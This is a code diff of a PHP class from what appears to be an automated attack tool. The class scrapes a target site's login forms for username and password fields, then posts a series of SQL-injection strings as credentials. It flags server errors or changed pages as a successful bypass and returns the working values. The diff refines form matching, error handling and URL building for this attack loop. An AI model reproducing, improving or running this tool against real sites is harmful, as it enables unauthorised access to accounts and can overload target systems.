@@ -70,12 +70,13 @@ class Site{
 		exit();
 	}*/
 
-	public function getNameFieldUsername()
+	public function getNameFieldUsername($actionForm)
 	{
 		$resultNameField=false;
 		$crawler 	= new Crawler($this->bodyTarget);
-		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField) {
-			if($node->attr('name'))
+		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField,&$actionForm) {
+
+			if($node->attr('name') AND $node->attr('type')!="submit" AND $this->sanitazeActionForm($node->parents()->filter('form')->attr('action'))== $actionForm)
 			{
 				$validNameField =  $this->verifyListNamesUsername($node->attr('name'));
 				$field[$node->attr('name')]=$node->attr('value');
@@ -87,12 +88,12 @@ class Site{
 		});
 		return $resultNameField;
 	}
-	public function getNameFieldPassword()
+	public function getNameFieldPassword($actionForm)
 	{
 		$resultNameField=false;
 		$crawler 	= new Crawler($this->bodyTarget);
-		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField) {
-			if($node->attr('name'))
+		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField,&$actionForm) {
+			if($node->attr('name') AND $this->sanitazeActionForm($node->parents()->filter('form')->attr('action'))== $actionForm)
 			{
 				$validNameField =  $this->verifyListNamesPassword($node->attr('type'));
 				$field[$node->attr('name')]=$node->attr('value');
@@ -125,11 +126,13 @@ class Site{
 	public function bruteForceAll($action,$method,$username,$password,$otherFields=array())
 	{
 		//$proxySiteList=new ProxySiteList();
-		//echo "\n".$username." -> ".$password;
+		//echo "\n".$username." -> ".$password.";\n";
+
 		$listForInjection=$this->listOfInjectionAdmin();
 		$pageControl="";
 		$sqlInjection=false;
 		$count0=0;
+		$count404=0;
 		foreach($listForInjection as $keyInjetion=> $injetion)
 		{
 			echo ".";
@@ -158,14 +161,13 @@ class Site{
 				'timeout' => 30
 				]
 			]);
-			if(strcasecmp($method,'post')==0){
 
+			if(strcasecmp($method,'post')==0){
 				try{
 					$body = $client->post($action,$dataToPost)->getBody()->getContents();
-
 				}catch(\Exception $e){
-					//var_dump($e);
-					if($e->getCode()=="500"){
+					if($e->getCode()=="500")
+					{
 						$sqlInjection=true;
 						$obs="is probably sql injection";
 						$body=false;
@@ -176,18 +178,25 @@ class Site{
 						if($count0==3)
 						{
 							$obs ="is probably break system with force manny requisitions";
+							$body=false;
 						}
 						$sqlInjection=true;
 					}
-					echo $e->getCode()." - page not Found;";
+					echo "\n".$e->getCode()." - page not Found;\n";
 
 					if($e->getCode()=="404"){
-						//echo $e->getCode()." - page not Found;";
-						break;
+						echo $e->getCode()." - page not Found;";
+						$count404++;
+
+						echo $count404;
+						$obs ="problem with mount url action";
+						$body=false;
+
+						//$sqlInjection=true;
+						//break;
 					}
 
 				}
-
 			}else{
 				try{
 					$body = $client->get($action,array(),$dataToPost)->getBody()->getContents();
@@ -203,8 +212,11 @@ class Site{
 				$pageControl=$body;
 			}
 
-			if((isset($body) AND $pageControl!=$body) OR $sqlInjection)
+			$resultIsAdmin=$this->isAdmin($body);
+
+			if(((isset($body) AND $pageControl!=$body) OR $sqlInjection)AND(!$resultIsAdmin OR !$body))
 			{
+
 				echo "\n...sussefull...\n";
 				$resultData['username']=$injetion;
 				$resultData['password']=$injetion;
@@ -213,7 +225,6 @@ class Site{
 				}
 				$sqlInjection=false;
 				$count0=0;
-				echo "\n";
 				return $resultData;
 			}
 			//sleep(1);
@@ -340,10 +351,26 @@ class Site{
 
 	private function sanitazeActionForm($action)
 	{
+		$targetIsUrl    = v::url()->notEmpty()->validate($action);
+		if($targetIsUrl)
+		{
+			return $action;
+		}
+
+		$existeBar = substr($action, 0, 1);
 		$explodeUrl=explode("/",$this->target);
-		array_pop($explodeUrl);
-		$implodeUrl=implode("/",$explodeUrl);
-		return $implodeUrl."/".$action;
+		if($existeBar!="/")
+		{
+			array_pop($explodeUrl);
+			$implodeUrl=implode("/",$explodeUrl);
+			$resultAction= $implodeUrl."/".$action;
+		}
+		else
+		{
+			$resultAction=$explodeUrl[0]."/".$explodeUrl[1]."/".$explodeUrl[2].$action;
+		}
+		return $resultAction;
+
 	}
 
 	public function getMethodForm()
